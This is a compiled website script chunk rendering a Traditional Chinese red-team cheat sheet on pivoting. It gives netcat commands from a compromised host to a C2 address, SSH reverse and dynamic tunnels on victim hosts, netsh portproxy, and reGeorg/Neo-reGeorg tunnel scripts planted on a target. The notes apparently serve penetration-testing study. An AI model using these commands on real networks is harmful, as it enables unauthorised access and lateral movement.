"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[986],{6874:(e,n,i)=>{i.r(n),i.d(n,{assets:()=>c,contentTitle:()=>t,default:()=>x,frontMatter:()=>d,metadata:()=>s,toc:()=>h});const s=JSON.parse('{"id":"Cyber-Security/Red_Team/pivoting","title":"\u7d05\u968a\u5b89\u5168 | \u7aef\u53e3\u8f49\u767c\u8207\u8df3\u677f","description":"tags: \u8cc7\u8a0a\u5b89\u5168\u3001\u653b\u64ca\u6280\u8853\u3001\u7d05\u968a\u6ef2\u900f","source":"@site/docs/Cyber-Security/Red_Team/pivoting.md","sourceDirName":"Cyber-Security/Red_Team","slug":"/Cyber-Security/Red_Team/pivoting","permalink":"/docs/Cyber-Security/Red_Team/pivoting","draft":false,"unlisted":false,"tags":[],"version":"current","frontMatter":{"sidebar_label":"\u7d05\u968a\u5b89\u5168 | \u7aef\u53e3\u8f49\u767c\u8207\u8df3\u677f"},"sidebar":"tutorialSidebar","previous":{"title":"\u7d05\u968a\u5b89\u5168 | LOLBAS \u4e0b\u8f09\u5de5\u5177","permalink":"/docs/Cyber-Security/Red_Team/lolbas"},"next":{"title":"Forensic Medicine \u6cd5\u91ab\u5b78","permalink":"/docs/category/forensic-medicine-\u6cd5\u91ab\u5b78"}}');var r=i(4848),l=i(8453);const d={sidebar_label:"\u7d05\u968a\u5b89\u5168 | \u7aef\u53e3\u8f49\u767c\u8207\u8df3\u677f"},t="\u7d05\u968a\u5b89\u5168 | \u7aef\u53e3\u8f49\u767c\u8207\u8df3\u677f",c={},h=[{value:"tags: <code>\u8cc7\u8a0a\u5b89\u5168</code>\u3001<code>\u653b\u64ca\u6280\u8853</code>\u3001<code>\u7d05\u968a\u6ef2\u900f</code>",id:"tags-\u8cc7\u8a0a\u5b89\u5168\u653b\u64ca\u6280\u8853\u7d05\u968a\u6ef2\u900f",level:6},{value:"\u7528\u9014",id:"\u7528\u9014",level:2},{value:"\u5e38\u898btunnel\u5206\u985e",id:"\u5e38\u898btunnel\u5206\u985e",level:2},{value:"\u63a2\u6e2c\u51fa\u7db2",id:"\u63a2\u6e2c\u51fa\u7db2",level:2},{value:"TCP",id:"tcp",level:3},{value:"UDP",id:"udp",level:3},{value:"Proxy chain",id:"proxy-chain",level:2},{value:"ssh tunneling",id:"ssh-tunneling",level:2},{value:"Chisel",id:"chisel",level:2},{value:"netsh portproxy (Windows)",id:"netsh-portproxy-windows",level:2},{value:"reGeorg (AV\u6703\u6293)",id:"regeorg-av\u6703\u6293",level:2},{value:"Neo-reGeorg",id:"neo-regeorg",level:2},{value:"Venom",id:"venom",level:2}];function o(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",h6:"h6",header:"header",li:"li",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",ul:"ul",...(0,l.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.header,{children:(0,r.jsx)(n.h1,{id:"\u7d05\u968a\u5b89\u5168--\u7aef\u53e3\u8f49\u767c\u8207\u8df3\u677f",children:"\u7d05\u968a\u5b89\u5168 | \u7aef\u53e3\u8f49\u767c\u8207\u8df3\u677f"})}),"\n",(0,r.jsxs)(n.h6,{id:"tags-\u8cc7\u8a0a\u5b89\u5168\u653b\u64ca\u6280\u8853\u7d05\u968a\u6ef2\u900f",children:["tags: ",(0,r.jsx)(n.code,{children:"\u8cc7\u8a0a\u5b89\u5168"}),"\u3001",(0,r.jsx)(n.code,{children:"\u653b\u64ca\u6280\u8853"}),"\u3001",(0,r.jsx)(n.code,{children:"\u7d05\u968a\u6ef2\u900f"})]}),"\n",(0,r.jsx)(n.h2,{id:"\u7528\u9014",children:"\u7528\u9014"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"\u5185\u7db2\u6a6b\u5411\u79fb\u52d5"}),"\n",(0,r.jsx)(n.li,{children:"\u8df3\u677f"}),"\n"]}),"\n",(0,r.jsx)(n.h2,{id:"\u5e38\u898btunnel\u5206\u985e",children:"\u5e38\u898btunnel\u5206\u985e"}),"\n",(0,r.jsxs)(n.table,{children:[(0,r.jsx)(n.thead,{children:(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.th,{children:"\u7db2\u8def\u5206\u5c64"}),(0,r.jsx)(n.th,{children:"\u5354\u5b9a"})]})}),(0,r.jsxs)(n.tbody,{children:[(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"\u61c9\u7528\u5c64"}),(0,r.jsx)(n.td,{children:"ssh, http, https, DNS"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"\u50b3\u8f38\u5c64"}),(0,r.jsx)(n.td,{children:"TCP, UDP"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"\u7db2\u8def\u5c64"}),(0,r.jsx)(n.td,{children:"IPv6, ICMP, GRE"})]})]})]}),"\n",(0,r.jsx)(n.h2,{id:"\u63a2\u6e2c\u51fa\u7db2",children:"\u63a2\u6e2c\u51fa\u7db2"}),"\n",(0,r.jsx)(n.h3,{id:"tcp",children:"TCP"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:["compromised\uff1a",(0,r.jsx)(n.code,{children:"nc -nv <C2 ip> <port>"})]}),"\n",(0,r.jsxs)(n.li,{children:["attacker\uff1a",(0,r.jsx)(n.code,{children:"nc -lvp <port>"})]}),"\n"]}),"\n",(0,r.jsx)(n.h3,{id:"udp",children:"UDP"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:["compromised\uff1a",(0,r.jsx)(n.code,{children:"nc -nv <C2 ip> <port>"})]}),"\n",(0,r.jsxs)(n.li,{children:["attacker\uff1a",(0,r.jsx)(n.code,{children:"nc -nlvp <port>"})]}),"\n"]}),"\n",(0,r.jsx)(n.h2,{id:"proxy-chain",children:"Proxy chain"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:["Proxy Chains","\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"sudo vim /etc/proxychains4.conf"}),"\n",(0,r.jsx)(n.li,{children:"socks5 127.0.0.1 9487"}),"\n",(0,r.jsxs)(n.li,{children:["USAGE\uff1a",(0,r.jsx)(n.code,{children:"proxychains <command>"})]}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,r.jsx)(n.h2,{id:"ssh-tunneling",children:"ssh tunneling"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:["SSH Tunnel","\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:["Remote Port Forwarding\uff1a",(0,r.jsx)(n.code,{children:"ssh -R kali:<port> user@linux host"}),"(\u53d7\u5bb3\u4e3b\u6a5f)"]}),"\n",(0,r.jsxs)(n.li,{children:["Dynamic Port Forwarding\uff1a",(0,r.jsx)(n.code,{children:"ssh \u2013D 127.0.0.1:9487 user@hostA"}),"(\u53d7\u5bb3\u4e3b\u6a5f)"]}),"\n",(0,r.jsx)(n.li,{children:"socks server"}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,r.jsx)(n.h2,{id:"chisel",children:"Chisel"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"https://github.com/jpillora/chisel",children:"https://github.com/jpillora/chisel"})}),"\n"]}),"\n",(0,r.jsx)(n.h2,{id:"netsh-portproxy-windows",children:"netsh portproxy (Windows)"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.code,{children:"netsh interface portproxy add v4tov4 listenaddress=<ip> listenport=<port> connectaddress=<tgt_ip> connectport=<tgt_port>"})}),"\n"]}),"\n",(0,r.jsx)(n.h2,{id:"regeorg-av\u6703\u6293",children:"reGeorg (AV\u6703\u6293)"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.code,{children:"https://github.com/sensepost/reGeorg"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"tunnel.ashx \u653e\u5728\u76ee\u6a19\u6a5f\u4e0a"}),"\n",(0,r.jsx)(n.li,{children:"\u653b\u64ca\u6a5f\u4e0a\u57f7\u884c\uff1apython2 reGeorgSocksProxy.py -u 'url' -p 'port'"}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,r.jsx)(n.h2,{id:"neo-regeorg",children:"Neo-reGeorg"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.a,{href:"https://github.com/L-codes/Neo-reGeorg",children:"https://github.com/L-codes/Neo-reGeorg"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"python neoreg.py generate \u2013k \u5bc6\u78bc"}),"\n",(0,r.jsx)(n.li,{children:"python neoreg.py \u2013k \u5bc6\u78bc \u2013u \u7db2\u5740"}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,r.jsx)(n.h2,{id:"venom",children:"Venom"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:["\u591a\u5c64\u8df3\u677f\uff1a",(0,r.jsx)(n.a,{href:"https://github.com/Dliv3/Venom",children:"https://github.com/Dliv3/Venom"})]}),"\n"]})]})}function x(e={}){const{wrapper:n}={...(0,l.R)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(o,{...e})}):o(e)}},8453:(e,n,i)=>{i.d(n,{R:()=>d,x:()=>t});var s=i(6540);const r={},l=s.createContext(r);function d(e){const n=s.useContext(l);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function t(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:d(e.components),s.createElement(l.Provider,{value:n},e.children)}}}]);